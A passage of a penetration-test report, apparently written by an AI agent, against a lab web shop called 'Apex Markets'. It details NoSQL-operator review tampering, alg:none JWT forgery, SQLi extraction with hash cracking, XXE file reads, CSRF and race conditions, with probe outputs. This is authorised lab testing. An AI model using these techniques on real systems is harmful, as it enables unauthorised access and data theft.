The API accepted a mismatched password confirmation and stored the first `password` value:

```text
mismatched-repeat register status=201 email='reg-mismatch-1781185969797@example.com'
mismatched-repeat login:'Correct123!' status=200
mismatched-repeat login:'Different123!' status=401
```

The API also accepted a request with no `passwordRepeat` field:

```text
missing-repeat register status=201 email='reg-missing-repeat-1781185969797@example.com'
missing-repeat login:'MissingRepeat123!' status=200
```

Finally, the API accepted and allowed login with a one-character password:

```text
weak-one-char register status=201 email='reg-weak-1781185969797@example.com'
weak-one-char login:'a' status=200
```

The same probe verified empty email and empty password were rejected with `400 Invalid email/password cannot be empty`, so the issue is not total absence of registration validation.

Evidence is saved in:

```text
workspace/scripts/apex_registration_validation_probe.py
workspace/scans/docker-apex-registration-validation-probes.csv
workspace/scans/docker-apex-registration-validation-summary.txt
```

**Impact:** Client-side registration controls can be bypassed by direct API calls. Users can be registered despite failed password confirmation checks, and accounts can be created with trivial passwords that are easy to guess or spray.

**Severity:** Medium

### F-55: Apex Markets product-review updates accept NoSQL selector operators

**Affected endpoint:** `PATCH /rest/products/reviews`

**Evidence:**

A Docker-only probe registered a disposable customer, created two disposable reviews, and then tested NoSQL-style selector objects in the review update body.

The endpoint passed the `id` value into a MarsDB selector. Unsupported operators leaked the NoSQL matcher and stack trace:

```text
patch-id-eq-own status=500
Unrecognized operator: $eq
at /apex-markets/node_modules/marsdb/dist/DocumentMatcher.js
```

The endpoint accepted `$regex` syntax and returned a normal zero-modification response when there was no match:

```text
patch-id-regex-no-match status=200
{"modified":0,"original":[],"updated":[]}
```

Most importantly, the endpoint accepted an `$ne` selector and updated every review whose `_id` did not equal the second disposable review ID:

```text
target_id=77EbPffPrXhcNJ26Q
other_id=g5HCDysd2AnYcPG2b
patch-id-ne-other-disposable status=200
{"modified":29,...}
```

The follow-up product-1 review read showed the unique marker applied to both the disposable target review and an existing seeded admin review:

```text
changed_ne_count=2 ids=["JAzrGvctrbjJhD4xG", "77EbPffPrXhcNJ26Q"]
reviews-after ... "author":"admin@apex-markets.example" ... "message":"nosql-ne-1781186124500"
```

Evidence is saved in:

```text
workspace/scripts/apex_nosql_review_probe.py
workspace/scans/docker-apex-nosql-review-probes.csv
workspace/scans/docker-apex-nosql-review-summary.txt
```

**Lab-state note:** The `$ne` proof changed review messages in lab state. The response confirmed `modified:29`, but the saved compact sample does not contain all original messages, so a reliable full restore was not attempted. Further review mutation probes should account for this changed state.

**Impact:** A normal customer can provide NoSQL selector objects instead of a single review ID and mass-edit product reviews across the application. This escalates F-30 from single-record review tampering to broad NoSQL-backed content manipulation.

**Severity:** High

### F-59: Apex Markets review likes are vulnerable to same-user race amplification

**Affected endpoint:** `POST /rest/products/reviews`

**Evidence:**

A Docker-only probe created two disposable Apex users, created one disposable review as the owner, and then sent 12 concurrent like requests as the same second user against that single review ID:

```text
marker=review-like-race-1781188207873
review_id=tchWTLgqWNT2gHrfq
race_attempts=12
race_status_counts={"200": 12}
before_likes=0
after_likes=12
successful_race_responses=12
forbidden_race_responses=0
```

The final review state stored the same liker identity 12 times:

```text
after_liked_by=["race-liker-1781188207347@example.com", ... repeated 12 times ...]
```

This is distinct from ordinary sequential duplicate likes: an earlier isolated probe showed the second sequential like returned `403 Not allowed`. The vulnerability is the concurrent check/update window.

Evidence is saved in:

```text
workspace/scripts/apex_review_like_race_probe.py
workspace/scans/docker-apex-review-like-race-probes.csv
workspace/scans/docker-apex-review-like-race-summary.txt
```

**Lab-state note:** The probe added disposable users `race-owner-1781188206797@example.com` and `race-liker-1781188207347@example.com`, plus review `tchWTLgqWNT2gHrfq` with marker `review-like-race-1781188207873` and `likesCount=12`.

**Impact:** A single authenticated account can manipulate review popularity metrics by issuing concurrent requests. This undermines product-review integrity and shows the like operation lacks an atomic uniqueness constraint or transaction-safe duplicate-vote check.

**Severity:** Medium

### F-60: Apex Markets accounting order APIs trust forged unsigned role JWTs

**Affected endpoints:**

- `GET /rest/order-history/orders`
- `PUT /rest/order-history/:orderId/delivery-status`

**Evidence:**

A Docker-only probe created two disposable customers and two disposable orders, then tested the accounting-only order-history APIs across unauthenticated, normal customer, legitimate admin, and forged unsigned-JWT contexts.

The list endpoint rejected unauthenticated, customer, and legitimate admin contexts:

```text
none-history-orders status=403 {"error":"Malicious activity detected"}
customer-a-history-orders status=403 {"error":"Malicious activity detected"}
admin-legit-history-orders status=403 {"error":"Malicious activity detected"}
```

The same endpoint accepted an unsigned `alg:none` JWT whose payload claimed role `accounting` for `acc0unt4nt@apex-markets.example`:

```text
forged-accounting-none-history-orders status=200
ids=["419e-db71e468aecad4fe", "45f6-d460aa07d19d5d1f", "f854-50a3b0fdbac7ba88"]
```

The returned data included both disposable orders plus an existing order, with order IDs, masked customer emails, totals, products, payment/address IDs, delivery prices, ETA, and internal `_id` values. A query-string variant also returned the same bulk dataset:

```text
forged-accounting-none-history-orders-query-user status=200
ids=["419e-db71e468aecad4fe", "45f6-d460aa07d19d5d1f", "f854-50a3b0fdbac7ba88"]
```

The probe then attempted a delivery-status update only on the disposable `419e-db71e468aecad4fe` order with the forged accounting token. The API accepted the update request:

```text
forged-accounting-toggle-disposable-b status=200 sample={"status":"success"}
```

Evidence is saved in:

```text
workspace/scripts/apex_accounting_order_history_probe.py
workspace/scans/docker-apex-accounting-order-history-probes.csv
workspace/scans/docker-apex-accounting-order-history-summary.txt
```

**Lab-state note:** The probe added disposable users/orders:

```text
acct-orders-a-1781189005164@example.com order_id=f854-50a3b0fdbac7ba88
acct-orders-b-1781189006871@example.com order_id=419e-db71e468aecad4fe
```

It also sent one forged accounting delivery-status update request against the second disposable order. The immediate public track-order read still showed `delivered:false`, so the accepted update response did not visibly change that public tracking representation.

**Impact:** An attacker who forges an unsigned JWT with role `accounting` can bypass the backend accounting-role check and retrieve bulk order history that is otherwise blocked, including order metadata across users. The accepted delivery-status update response also shows write-side accounting actions are reachable with the forged role token.

**Severity:** High

### F-61: Apex Markets allows checkout of deleted and unlisted products by raw ProductId

**Affected service:** `apex-markets.acme.local`

**Evidence:**

A read-only Docker SQLi enumeration of the `Products` table identified hidden/deleted products that are absent from the public catalog. The deleted rows included:

```text
id=10 name="Christmas Super-Surprise-Box (2014 Edition)" deletedAt="2026-06-11 12:25:12.118 +00:00"
id=11 name="Rippertuer Special Juice" deletedAt="2026-06-11 12:25:12.129 +00:00"
```

A Docker-only disposable-account checkout probe then verified that public catalog controls hide those products, but the basket and checkout backend still accept them by raw `ProductId`:

```text
email=deleted-product-1781189730656@example.com
bid=70
public_products_status=200
public_contains_product_10=False
public_contains_product_11=False
direct-product-10 GET /api/Products/10 status=404
direct-product-11 GET /api/Products/11 status=404
add-deleted-product-10 POST /api/BasketItems/ status=200
add-deleted-product-11 POST /api/BasketItems/ status=200
basket_contains_product_10=True
basket_contains_product_11=True
checkout_status=200
order_id=60dd-a32bef2817cf015d
history_contains_product_10=True
history_contains_product_11=True
```

The resulting order history contained both deleted products:

```text
"products":[
  {"quantity":1,"id":10,"name":"Christmas Super-Surprise-Box (2014 Edition)","price":29.99,"total":29.99},
  {"quantity":1,"id":11,"name":"Rippertuer Special Juice","price":16.99,"total":16.99}
]
```

Evidence is saved in:

```text
workspace/scripts/apex_deleted_product_checkout_probe.py
workspace/scans/docker-apex-deleted-product-checkout-probes.csv
workspace/scans/docker-apex-deleted-product-checkout-summary.txt
```

**Lab-state note:** The probe created disposable user `deleted-product-1781189730656@example.com`, basket `70`, basket items `56` and `57`, saved card/address records `27`, and order `60dd-a32bef2817cf015d`.

**Impact:** Backend order creation trusts client-supplied product identifiers without enforcing product visibility or deletion state. A normal customer can buy hidden, seasonal, removed, or explicitly unsafe products that the catalog and direct product APIs intentionally hide.

**Severity:** High

### F-62: Apex Markets exposes recycle pickup records by predictable ID without authentication

**Affected service:** `apex-markets.acme.local`

**Evidence:**

A Docker-only generated API table coverage matrix tested 21 table-backed endpoint names as unauthenticated, customer, and admin contexts. The matrix showed most sensitive generated endpoints either require authorization or route to existing verbose error handling, but `GET /api/Recycles/:id` returns recycle pickup records without authentication:

```text
rows=126
status_counts={"200": 44, "400": 2, "401": 29, "403": 3, "500": 48}
public_200_count=10
/api/Recycles/1 status=200 shape=list len=1 keys=AddressId,UserId,createdAt,date,id,isPickup,quantity,updatedAt
```

A follow-up bounded enumeration of IDs 1 through 15 confirmed 11 records were exposed without credentials:

```text
recycle_ids_tested=1..15
exposed_recycle_count=11
referenced_address_ids=1,2,3,4,6
exposed /api/Recycles/1 data=[{"AddressId": 4, "UserId": 2, "date": "2270-01-17T00:00:00.000Z", "id": 1, "isPickup": true, "quantity": 800, ...}]
exposed /api/Recycles/2 data=[{"AddressId": 6, "UserId": 3, "date": "2006-01-14T00:00:00.000Z", "id": 2, "isPickup": true, "quantity": 1320, ...}]
exposed /api/Recycles/9 data=[{"AddressId": 2, "UserId": 16, "date": "2019-02-18T00:00:00.000Z", "id": 9, "isPickup": true, "quantity": 500, ...}]
```

The same follow-up checked the referenced address IDs through unauthenticated address routes. Those requests returned Angular-route stack traces rather than full address objects, so the proven impact is recycle pickup metadata plus internal `UserId` and `AddressId` linkage, not full postal-address disclosure:

```text
/api/Addresses/1 status=500
/rest/user/address/1 status=500
```

Evidence is saved in:

```text
workspace/scripts/apex_generated_api_table_coverage_probe.py
workspace/scripts/apex_recycles_bola_probe.py
workspace/scans/docker-apex-generated-api-table-coverage-probes.csv
workspace/scans/docker-apex-generated-api-table-coverage-summary.txt
workspace/scans/docker-apex-recycles-bola-probes.csv
workspace/scans/docker-apex-recycles-bola-summary.txt
```

**Impact:** Anyone can enumerate recycle pickup records by predictable integer ID and learn which internal users and address records have pickups, the pickup dates, whether pickup was requested, and the recycle quantities. This is a direct object-level authorization failure on an auxiliary order/account data type.

**Severity:** Low

### F-63: Apex Markets legacy profile form allows cookie-authenticated CSRF username changes

**Affected service:** `apex-markets.acme.local`

**Evidence:**

A Docker-only authenticated fetch of `/profile` with a disposable user's token cookie returned the legacy profile page. The page contains plain HTML forms with no CSRF token, including:

```html
<form action="./profile" method="post">
  <input id="username" type="text" name="username" ...>
  <button id="submit" type="submit">Set Username</button>
</form>
```

The exact legacy form behavior was then tested with a disposable account. Before the probe, the user had an empty `username`:

```text
email=legacy-profile-csrf-1781191542186@example.com
before_user={... "id": 90, "username": ""}
```

A cross-origin form-style POST to `/profile`, using only a `token` cookie and attacker `Origin`/`Referer` headers, returned `200` and changed the username:

```text
cross-origin-cookie-form-post-profile status=200 cookie=True auth_header=False sent=form
after_user={... "id": 90, "username": "legacy-profile-csrf-1781191542186"}
cookie_form_username_changed=True
```

The control using an Authorization header but no cookie was rejected by the legacy route and did not change the username further:

```text
header-form-post-profile-control status=500 cookie=False auth_header=True sent=form
header_form_username_changed=False
```

The login API response in this probe did not include a `Set-Cookie` header:

```text
login_set_cookie=
```

So the proven issue is that the legacy profile route is cookie-authenticated and CSRF-compatible if a valid `token` cookie is present; the probe did not prove that the normal login flow automatically creates such a cookie.

Evidence is saved in:

```text
workspace/scripts/apex_fetch_profile_assets.py
workspace/scripts/apex_legacy_profile_csrf_form_probe.py
workspace/scans/apex-profile-page/profile-cookie.html
workspace/scans/apex-profile-page/profile-fetch-summary.txt
workspace/scans/docker-apex-legacy-profile-csrf-form-probes.csv
workspace/scans/docker-apex-legacy-profile-csrf-form-summary.txt
```

**Impact:** A valid token cookie on the Apex domain can be used by a cross-origin HTML form submission to change the victim's profile username because the legacy form endpoint has no CSRF token or origin enforcement. This is a lower-impact state change, but it confirms a real CSRF pattern on the legacy profile surface.

**Severity:** Low to Medium

## Coverage Confidence

We cannot honestly claim mathematical proof that every possible issue was found. The confidence comes from cross-checking the same attack surface with multiple independent methods:

- **All documented scope was reached:** all four hostnames were tested live through the proxy.
- **Docker-only follow-up evidence was captured:** critical follow-up checks were executed inside the Docker toolbox after the user clarified that testing should happen there. Relevant files include `workspace/scans/docker-portal-path-probe.csv`, `workspace/scans/docker-portal-deep-path-probe.csv`, `workspace/scans/docker-portal-method-probe.csv`, `workspace/scans/docker-apex-extracted-path-probe.csv`, `workspace/scans/docker-apex-auth-critical-probes.csv`, and `workspace/scans/docker-customer-api-critical-probes.csv`.
- **All public code was reviewed:** Gitea API showed exactly four public repos, and all four were cloned and searched in working tree plus full Git history.
- **All Customer API documented routes were enumerated:** OpenAPI showed 13 routes; unauthenticated, authenticated, admin-relevant, object-level authorization, mass-assignment, mutation, and JWT-forgery behavior were tested. Critical findings were reproduced from inside the Docker toolbox in `workspace/scans/docker-customer-api-critical-probes.csv`; gap probes including `_debug`, book creation, email update, and delete behavior are saved in `workspace/scans/docker-customer-api-gap-probes.csv`. A later Docker route matrix covered unauthenticated, `name1`, `name2`, seeded `admin`, mass-assigned admin, and normal disposable-user contexts across reads and mutations. It confirmed seeded and newly created book secrets are readable by all authenticated users, confirmed mass-assigned admin delete, confirmed cross-user password change, showed the documented `_debug` path returns `404`, showed unauthenticated book creation is rejected, and showed Customer API rejected `alg:none` plus lab-derived HS256 secret candidates for `/me`. A follow-up parser/injection edge probe tested login SQLi/object/array/SSTI payloads, form content-type login/register variants, path-parameter SQLi/SSTI/wildcard payloads for users and books, and stored book-title/secret edge values; it did not produce auth bypass, backend error leakage, template evaluation, wildcard book exfiltration, or parser content-type bypass. Evidence is saved in `workspace/scans/docker-customer-api-matrix-probes.csv`, `workspace/scans/docker-customer-api-matrix-summary.txt`, `workspace/scans/docker-customer-api-injection-edge-probes.csv`, and `workspace/scans/docker-customer-api-injection-edge-summary.txt`.
- **Apex was tested from metadata and behavior:** challenge metadata, client bundle routes, public endpoints, auth flows, file server, metrics, config, and basket/user APIs were exercised. Key route and authenticated probes were reproduced from inside the Docker toolbox in `workspace/scans/docker-apex-extracted-path-probe.csv`, `workspace/scans/docker-apex-auth-critical-probes.csv`, `workspace/scans/docker-apex-gap-probes.csv`, and `workspace/scans/docker-apex-gap-evidence-summary.txt`.
- **Apex FTP artifacts were analyzed locally:** `encrypt.pyc` and `announcement_encrypted.md` were handled with a dependency-free Docker-local decryptor. `incident-support.kdbx` was parsed and checked from inside Docker as KDBX3/AES-CBC/gzip with `transform_rounds=1`. The latest Docker-local checker uses Python `ctypes` against the toolbox image's local `libcrypto`, validated against OpenSSL for AES-256-ECB and AES-256-CBC behavior, and tested 3,023,421 focused, lab-derived, and refreshed incremental evidence-derived candidates without opening the database. The refreshed incremental set contains 1,960,591 candidates generated from current `loot`, `scans`, `notes`, and `scripts` artifacts after subtracting the prior focused/lab-derived sets. Evidence is saved in `workspace/scans/docker-kdbx-candidate-check.txt`, `workspace/scans/docker-kdbx-incremental-check.txt`, `workspace/scans/docker-kdbx-incremental-check-rerun.txt`, `workspace/scans/docker-kdbx-focused-candidates.txt`, and `workspace/scans/docker-kdbx-incremental-candidates.txt`.
- **Apex artifact-derived and GDPR account-lifecycle probes were run:** file upload, complaint creation, data export, erasure request, product reviews, hidden easter path, and private assets were probed from inside Docker. A later disposable owner/victim matrix tested data-export body, query, form, and GET variants with victim/admin emails; every successful export returned the authenticated owner email, and erasure-path candidates did not delete either disposable account. Evidence is saved in `workspace/scans/docker-apex-artifact-probes.csv`, `workspace/scans/docker-apex-artifact-evidence-summary.txt`, `workspace/scans/docker-apex-gdpr-export-erasure-probes.csv`, and `workspace/scans/docker-apex-gdpr-export-erasure-summary.txt`.
- **Apex file-handling classes were expanded:** `/file-upload` was probed with safe XML, unauthenticated and authenticated XXE payloads, YAML `!!js/regexp`, YAML anchors, double-extension PDF/PHP, and an oversize PDF. This confirmed unauthenticated `/etc/passwd` disclosure via XXE as F-44 and type/size validation bypass as F-45. YAML parsing reflected parsed objects but did not prove code execution. A follow-up XXE path matrix tested 20 local paths including `/proc/self/*`, `/apex-markets/package*.json`, `/apex-markets/config/*`, `/apex-markets/ftp/*`, `/apex-markets/build/*`, `/app/package.json`, and `/juice-shop/package.json`; it confirmed `/etc/passwd` and `/etc/hostname` reads but did not expose additional high-value config or secrets. A later log-path matrix used the same XXE vector against 25 common runtime log paths under `/var/log`, `/apex-markets`, `/tmp`, and npm logs; every entity expansion was empty or a parse/missing-file result, so no access-log content was recovered through those paths. Evidence is saved in `workspace/scans/docker-apex-file-handling-probes.csv`, `workspace/scans/docker-apex-file-handling-summary.txt`, `workspace/scans/docker-apex-xxe-path-probes.csv`, `workspace/scans/docker-apex-xxe-path-summary.txt`, `workspace/scans/docker-apex-xxe-log-path-probes.csv`, and `workspace/scans/docker-apex-xxe-log-path-summary.txt`.
- **Apex arbitrary file-write follow-up did not prove overwrite:** a Docker-only probe fetched `/ftp/legal.md`, attempted traversal and null-byte upload filenames against `/file-upload` (`../ftp/legal.md`, multi-depth variants, encoded variants, `%00.pdf`, and `.pdf` suffix variants), and refetched `/ftp/legal.md` after each attempt. The upload endpoint returned success-like responses for most filenames, but the legal file length/content stayed at the baseline and the marker never appeared; no overwrite/retrieval path was proven. Evidence is saved in `workspace/scans/docker-apex-arbitrary-file-write-probes.csv` and `workspace/scans/docker-apex-arbitrary-file-write-summary.txt`.
- **Apex remaining challenge classes were partially probed:** unsigned JWT access was confirmed; basket writes against basket `1` were rejected as `Invalid BasketId`; coupon candidates from `coupons_2013.md.bak` were rejected as invalid; checkout with insufficient wallet balance returned a stack trace; review/feedback routes returned transient `502` responses during the probe and were later retested separately. Evidence is saved in `workspace/scans/docker-apex-remaining-probes.csv` and `workspace/scans/docker-apex-jwt-none-evidence.txt`.
- **Apex basket, checkout, and review classes were re-tested with correct context:** using the per-user `bid` from login confirmed negative basket quantity and checkout behavior; isolated review probes confirmed patching existing admin reviews and creating forged-author reviews. A later deleted-product checkout probe used SQLi-derived hidden ProductIds and confirmed the public catalog/direct product routes hide deleted products while `/api/BasketItems/` and checkout still accept them, documented as F-61. A later NoSQL review probe confirmed `PATCH /rest/products/reviews` accepts selector operators and a `$ne` body updated 29 reviews, documented as F-55. Sequential duplicate review likes were rejected, but a concurrent same-user race probe accepted 12 of 12 like requests and inflated one disposable review to `likesCount=12`, documented as F-59. A later generated API table coverage matrix found unauthenticated `GET /api/Recycles/:id` exposes recycle pickup records by predictable ID, documented as F-62. Evidence is saved in `workspace/scans/docker-apex-basket-context-probes.csv`, `workspace/scans/docker-apex-basket-context-summary.txt`, `workspace/scans/docker-apex-deleted-product-checkout-probes.csv`, `workspace/scans/docker-apex-deleted-product-checkout-summary.txt`, `workspace/scans/docker-apex-review-feedback-probes.csv`, `workspace/scans/docker-apex-nosql-review-probes.csv`, `workspace/scans/docker-apex-nosql-review-summary.txt`, `workspace/scans/docker-apex-review-like-race-probes.csv`, `workspace/scans/docker-apex-review-like-race-summary.txt`, `workspace/scans/docker-apex-generated-api-table-coverage-summary.txt`, and `workspace/scans/docker-apex-recycles-bola-summary.txt`.
- **Apex feedback/CAPTCHA workflow was re-tested with valid CAPTCHA fields:** zero-star feedback and forged `UserId` feedback were accepted after using the disclosed CAPTCHA answer. A bulk anti-automation follow-up requested fresh disclosed CAPTCHA answers and submitted 12 feedback entries in 6.5 seconds, documented as F-58. A separate public-feedback probe found an unauthenticated 12-word Web3 wallet seed phrase embedded in seeded feedback and tied to `/juicy-nft`, documented as F-48. Evidence is saved in `workspace/scans/docker-apex-feedback-captcha-probes.csv`, `workspace/scans/docker-apex-feedback-captcha-summary.txt`, `workspace/scans/docker-apex-captcha-bulk-feedback-probes.csv`, `workspace/scans/docker-apex-captcha-bulk-feedback-summary.txt`, `workspace/scans/docker-apex-public-wallet-seed-probes.csv`, and `workspace/scans/docker-apex-public-wallet-seed-summary.txt`.
- **Apex coupon behavior was expanded:** `coupons_2013.md.bak` is Z85-encoded and decodes to expired-looking coupon strings such as `JAN13-10` through `DEC13-15`; raw, decoded, and small obvious 2013 variants were rejected for a fresh basket. Frontend review then identified client-side `couponDetails`/`couponData` handling. Docker checkout probes confirmed expired hard-coded `ORANGE2020` through `ORANGE2023` couponData can be redeemed directly during checkout, documented as F-46. A corrected chatbot conversation probe then followed the `setname` token flow and showed the chatbot discloses valid 10% coupon `n(XRwhz3Tq`; a redemption probe confirmed `/rest/basket/:id/coupon/:code` returns `{"discount":10}` and checkout records `promotionalAmount "0.40"`, documented as F-47. Follow-up Z85 derivation proved the disclosed `JUN26-10` scheme can be forged into `JUN26-80` and `JUN26-99`, with `/coupon/` returning discounts 80 and 99 and checkout applying the 99% code to a normal positive card order, documented as F-56. Evidence is saved in `workspace/scans/docker-apex-coupon-probes.csv`, `workspace/scans/docker-apex-coupon-summary.txt`, `workspace/scans/docker-apex-checkout-coupondata-probes.csv`, `workspace/scans/docker-apex-checkout-coupondata-summary.txt`, `workspace/scans/docker-apex-coupondata-positive-checkout-probes.csv`, `workspace/scans/docker-apex-coupondata-positive-checkout-summary.txt`, `workspace/scans/docker-apex-chatbot-conversation-probes.csv`, `workspace/scans/docker-apex-chatbot-conversation-summary.txt`, `workspace/scans/docker-apex-chatbot-coupon-redeem-probes.csv`, `workspace/scans/docker-apex-chatbot-coupon-redeem-summary.txt`, `workspace/scans/docker-apex-forged-coupon-probes.csv`, `workspace/scans/docker-apex-forged-coupon-summary.txt`, `workspace/scans/docker-apex-forged-coupon-checkout-probes.csv`, and `workspace/scans/docker-apex-forged-coupon-checkout-summary.txt`.
- **Apex account/payment routes were tested:** 2FA status, setup, verify, disable, deluxe upgrade modes, saved addresses, saved cards, and wallet balance were probed with disposable customers. Free deluxe upgrade was accepted; address/card `UserId` mass assignment was not accepted because the API stored the authenticated user ID; saved card creation echoed the submitted card number while later reads masked it. The 2FA verify follow-up confirmed missing/random/setup-token temp values were rejected, but unsigned forged temp JWTs with the expected `userId` and `type` were accepted when paired with a valid TOTP, documented as F-52. Evidence is saved in `workspace/scans/docker-apex-account-payment-probes.csv`, `workspace/scans/docker-apex-account-payment-summary.txt`, `workspace/scans/docker-apex-2fa-verify-probes.csv`, and `workspace/scans/docker-apex-2fa-verify-summary.txt`.
- **Apex cookie-auth/CSRF profile behavior was probed:** disposable-user tests showed `/rest/user/whoami` and the legacy `/profile` route honor a frontend-set `token` cookie, while Authorization-protected APIs such as `/rest/user/authentication-details/`, `/rest/saveLoginIp`, and `/rest/basket/:id` still require the Authorization header. Cookie-only `/rest/user/change-password` did not change the password, and the first profile probe missed the exact legacy form content type. A later Docker-authenticated fetch of `/profile` recovered the legacy HTML form, and an exact cross-origin `application/x-www-form-urlencoded` `POST /profile` with only a token cookie changed the disposable user's `username`; the same form POST with Authorization header only was rejected. This is documented as F-63, with the caveat that the login API did not set the token cookie automatically in the probe. A final profile-image URL probe exercised the sibling legacy `POST /profile/image/url` handler with same-origin Apex, Customer API, DevOps Hub, and `file://` payloads. HTTP URLs were stored verbatim in the user's `profileImage` and rendered back as the `<img src>`, while `file:///etc/hostname` and `file:///etc/passwd` returned invalid-URI errors and did not change the stored image. No SSRF fetch, local-file read, or response-body storage was proven for this route. Evidence is saved in `workspace/scans/docker-apex-cookie-csrf-probes.csv`, `workspace/scans/docker-apex-cookie-csrf-summary.txt`, `workspace/scans/docker-apex-profile-csrf-probes.csv`, `workspace/scans/docker-apex-profile-csrf-summary.txt`, `workspace/scans/apex-profile-page/profile-cookie.html`, `workspace/scans/apex-profile-page/profile-fetch-summary.txt`, `workspace/scans/docker-apex-legacy-profile-csrf-form-probes.csv`, `workspace/scans/docker-apex-legacy-profile-csrf-form-summary.txt`, `workspace/scans/docker-apex-profile-image-url-probes.csv`, and `workspace/scans/docker-apex-profile-image-url-summary.txt`.
- **Apex user-record write-side BOLA was tested with disposable users:** an attacker account could read a separate victim account through `GET /api/Users/:id`, consistent with F-12, but attacker attempts to `PUT` or `DELETE` the victim record were rejected with `401` and `PATCH /api/Users/:id` routed to the SPA error path rather than modifying the record. No cross-user user-record write/delete was proven. Evidence is saved in `workspace/scans/docker-apex-user-record-bola-probes.csv` and `workspace/scans/docker-apex-user-record-bola-summary.txt`.
- **Apex product-search SQLi was expanded beyond credentials:** schema, users, cards, addresses, security questions, and security-answer hashes were extracted through the same injection point. Evidence is saved in `workspace/scans/docker-apex-sqli-deep-probes.csv`, `workspace/scans/docker-apex-sqli-deep-summary.txt`, `workspace/scans/docker-apex-security-answers-probe.csv`, and `workspace/scans/docker-apex-security-answers-summary.txt`.
- **Apex dumped hashes were cracked and artifact-matched offline:** a lab-derived candidate set of 1,015,557 values cracked 6 of 29 Apex MD5 password hashes, including valid admin, testing-admin, and deluxe accounts; no security-answer SHA-256 hashes cracked. Later targeted and artifact-derived passes verified valid original passwords for Amy, MC SafeSearch, Jim, and Bender. The artifact pass parsed current lab artifacts into 114,284 candidate strings, compared them to 27 SQLi-exfiltrated Apex MD5 hashes, and attempted live login only for exact hash matches. Evidence is saved in `workspace/scans/docker-apex-hash-crack-probes.csv`, `workspace/scans/docker-apex-hash-crack-summary.txt`, `workspace/scans/docker-apex-cracked-login-verify.csv`, `workspace/scans/docker-apex-cracked-login-verify-summary.txt`, `workspace/scans/docker-apex-targeted-identity-login-summary.txt`, and `workspace/scans/docker-apex-artifact-password-hash-matches-summary.txt`.
- **Apex client-side credential exposure was verified:** the frontend bundle exposes `testing@juice-sh.op / IamUsedForTesting`; the password works for `testing@apex-markets.example` and logs in as admin. Evidence is saved in `workspace/scans/docker-apex-client-exposed-credentials-probes.csv` and `workspace/scans/docker-apex-client-exposed-credentials-summary.txt`.
- **Apex static/file exposure was broadened:** `/ftp/` artifacts, hidden/private assets referenced by the easter page, language-file candidates, and access-log candidates were probed. The hidden `/assets/i18n/tlh_AA.json` language file is public; HTTP access-log candidates returned SPA fallback HTML, not logs, and XXE log-path candidates did not return log content. Evidence is saved in `workspace/scans/docker-apex-static-exposure-probes.csv`, `workspace/scans/docker-apex-static-exposure-summary.txt`, and `workspace/scans/docker-apex-xxe-log-path-summary.txt`.
- **Apex account-management password change was tested:** a disposable account confirmed `/rest/user/change-password` performs a real password change through a GET query string containing both current and new passwords. Evidence is saved in `workspace/scans/docker-apex-change-password-get-probes.csv` and `workspace/scans/docker-apex-change-password-get-summary.txt`.
- **Apex password-reset behavior was tested with a disposable account:** the frontend registration sequence was reproduced by posting first to `/api/Users/` and then to `/api/SecurityAnswers/`. Product-search SQLi extracted the disposable user's stored recovery-answer hash, but the reset endpoint rejected both the locally computed SHA-256 and the leaked stored hash with `401`. The same endpoint accepted the plaintext answer and the new password then worked. This confirms answer-hash exposure is sensitive but did not prove direct hash replay. A later Docker follow-up dumped 20 live Apex security-answer SHA-256 hashes through the same SQLi family and tested 3,024,811 current lab-derived candidate strings without cracking any answer. Evidence is saved in `workspace/scans/docker-apex-reset-password-probes.csv`, `workspace/scans/docker-apex-reset-password-summary.txt`, `workspace/scans/docker-apex-security-answer-crack-followup.csv`, and `workspace/scans/docker-apex-security-answer-crack-followup-summary.txt`.
- **Apex registration validation was probed directly:** Docker-only requests showed `POST /api/Users/` accepts mismatched password confirmation, missing `passwordRepeat`, and one-character passwords, while still rejecting empty email/password. This is documented as F-54. Evidence is saved in `workspace/scans/docker-apex-registration-validation-probes.csv` and `workspace/scans/docker-apex-registration-validation-summary.txt`.
- **Apex API-backed and client-side XSS sinks were tested/reviewed:** product reviews, feedback, complaints, and Photo Wall memories were probed with unique iframe JavaScript payloads. Reviews, complaints, and Photo Wall captions stored and returned the payload value; feedback sanitized the same payload to an empty comment. Photo Wall upload handling was also checked: unauthenticated upload was rejected, SVG upload was rejected by MIME validation, and a PNG-magic `photo.php` upload was stored with a `.png` suffix and served as `image/png`, not executed in the tested path. A follow-up chatbot-name/username XSS matrix used fresh accounts and `<iframe>`, `<img onerror>`, `<svg onload>`, quote-breakout, and plain markers; the name field stored only mangled fragments such as `rc=x onerror=...>` or `nload=...>` rather than complete executable tags, so no additional username XSS finding was claimed. Local frontend-bundle review found separate search DOM XSS and track-result hash reflected XSS flows, documented as F-53. Evidence is saved in `workspace/scans/docker-apex-xss-sink-probes.csv`, `workspace/scans/docker-apex-xss-sink-summary.txt`, `workspace/scans/docker-apex-photo-wall-probes.csv`, `workspace/scans/docker-apex-photo-wall-summary.txt`, `workspace/scans/docker-apex-photo-wall-file-fetch-summary.txt`, `workspace/scans/docker-apex-username-xss-probes.csv`, `workspace/scans/docker-apex-username-xss-summary.txt`, `workspace/scans/docker-apex-username-xss-variant-probes.csv`, `workspace/scans/docker-apex-username-xss-variant-summary.txt`, and `workspace/scans/apex-client-xss-static-summary.txt`.
- **Apex HTTP header storage was tested:** `/rest/saveLoginIp` was exercised with unique iframe JavaScript payloads in `X-Forwarded-For`, `True-Client-IP`, `X-Real-IP`, `Forwarded`, and `User-Agent`. Only `True-Client-IP` was stored verbatim as `lastLoginIp` and reappeared through `/rest/user/authentication-details/` and `/api/Users`, documented as F-43. Evidence is saved in `workspace/scans/docker-apex-header-xss-probes.csv` and `workspace/scans/docker-apex-header-xss-summary.txt`.
- **Apex miscellaneous generated/helper routes were matrixed:** unauthenticated, customer, and admin contexts were tested against `Deliverys`, `Quantitys`, `Recycles`, `country-mapping`, `image-captcha`, `languages`, `whoami`, continue-code, repeat-notification, track-order, and basket helper routes. This found public quantity/delivery metadata and an unauthenticated continue-code value. A follow-up continue-code apply probe confirmed the public code can be applied without authentication to restore 11 solved challenges, documented as F-51. `/rest/image-captcha/` without the expected path parameter produced another verbose stack trace covered by F-17. Authenticated `POST /api/Recycles/` accepted a synthetic recycle entry with null ownership fields; unauthenticated follow-up POSTs were rejected with `401`, so this was recorded as coverage rather than a standalone finding. A follow-up generated-API mutation probe confirmed unauthenticated `PUT /api/Products/1` changes product catalog data, documented as F-49, while item-specific `Quantitys` mutation attempts returned `403 Malicious activity detected` in unauthenticated, customer, and admin contexts. A later synthetic-record mutation probe checked `Deliverys`, `SecurityQuestions`, and `Recycles`: `Deliverys` POST routed to verbose `500` stack traces, `SecurityQuestions` POST stayed blocked by authorization/token errors, 